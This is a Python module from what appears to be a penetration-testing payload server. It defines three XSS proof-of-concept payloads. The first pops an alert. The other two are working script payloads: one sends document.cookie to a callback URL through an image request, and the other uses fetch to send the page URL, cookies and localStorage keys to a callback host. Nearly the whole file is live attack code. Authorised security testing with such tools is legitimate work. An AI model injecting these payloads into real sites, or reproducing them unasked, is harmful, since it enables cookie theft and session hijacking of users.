"""XSS 跨站脚本 PoC"""
from ..base import poc, PocRequest, PocResponse


@poc(
    name="xss-alert",
    description="基础 XSS 弹窗测试（仅验证执行）",
    category="xss",
    content_type="text/html",
    usage='<script src="{url}"></script>',
    response_body="<script>alert(document.domain)</script>",
)
async def xss_alert(req: PocRequest) -> PocResponse:
    return PocResponse(body="<script>alert(document.domain)</script>")


@poc(
    name="xss-cookie",
    description="XSS Cookie 外带（验证+数据回传）",
    category="xss",
    content_type="text/html",
    usage='<script src="{url}"></script>',
    response_body="<script>new Image().src='{{callback_url}}?_exfil=1&_type=cookie&_data='+encodeURIComponent(document.cookie)+'&domain='+document.domain</script>",
    enable_variables=True,
)
async def xss_cookie(req: PocRequest) -> PocResponse:
    cb = req.query_params.get("cb") or req.base_url
    body = (
        f"<script>new Image().src='{cb}?_exfil=1&_type=cookie&_data='"
        f"+encodeURIComponent(document.cookie)+'&domain='+document.domain</script>"
    )
    return PocResponse(body=body)


@poc(
    name="xss-dom",
    description="XSS DOM 信息外带",
    category="xss",
    content_type="text/html",
    usage='<script src="{url}"></script>',
    response_body="<script>fetch('{{callback_url}}?_exfil=1&_type=dom&_data='+encodeURIComponent(JSON.stringify({url:location.href,cookie:document.cookie,localStorage:Object.keys(localStorage)})))</script>",
    enable_variables=True,
)
async def xss_dom(req: PocRequest) -> PocResponse:
    cb = req.query_params.get("cb") or req.base_url
    body = (
        f"<script>fetch('{cb}?_exfil=1&_type=dom&_data='"
        f"+encodeURIComponent(JSON.stringify({{url:location.href,"
        f"cookie:document.cookie,"
        f"localStorage:Object.keys(localStorage)}}))"
        f")</script>"
    )
    return PocResponse(body=body)
